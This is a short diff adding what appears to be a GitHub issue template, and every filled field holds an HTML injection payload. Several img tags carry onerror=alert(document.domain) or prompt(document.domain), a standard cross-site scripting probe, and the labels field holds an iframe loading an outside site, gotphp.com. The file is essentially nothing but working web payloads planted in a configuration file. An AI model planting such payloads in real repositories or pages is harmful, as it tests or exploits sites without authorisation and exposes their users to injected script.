@@ -1,0 +1,10 @@
+
+name: ok.html
+about: <img src=ok.html onerror=alert(document.domain)>
+title: <img src=ok.html onerror=alert(document.domain)>
+labels: <iframe src="https://gotphp.com"></iframe>
+assignees: ''
+
+
+<html><body><img src=g onerror=prompt(document.domain)></img%></body></html>
+<img src=ok.html onerror=alert(document.domain)>
